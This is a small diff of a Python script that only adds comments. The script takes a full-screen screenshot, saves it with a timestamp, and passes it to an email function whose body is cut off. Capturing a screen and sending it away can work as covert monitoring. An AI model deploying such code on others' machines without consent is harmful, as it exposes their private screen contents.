@@ -16,15 +16,15 @@ from PIL import ImageQt
 #from PyQt4.QtGui import QImage
 def screen_shot():
   
-  SaveDirectory=r'C:\dell'
-  ImageEditorPath=r'C:\WINDOWS\system32\mspaint.exe'
+  SaveDirectory=r'C:\dell' #location to save image(screenshot)
+  ImageEditorPath=r'C:\WINDOWS\system32\mspaint.exe' #location of paint
 
-  img=ImageGrab.grab()
+  img=ImageGrab.grab()  #taking screenshot
   time.sleep(3)
   saveas=os.path.join(SaveDirectory,'ScreenShot_'+'{0:%Y_%m_%d_%H_%M_%S}'.format(datetime.datetime.now())+'.jpg')
   img.save(saveas)
   
-  eemail(saveas)
+  eemail(saveas)            
 def eemail(ImgFileName): 
   img_data = open(ImgFileName, 'rb').read()
   time.sleep(2)
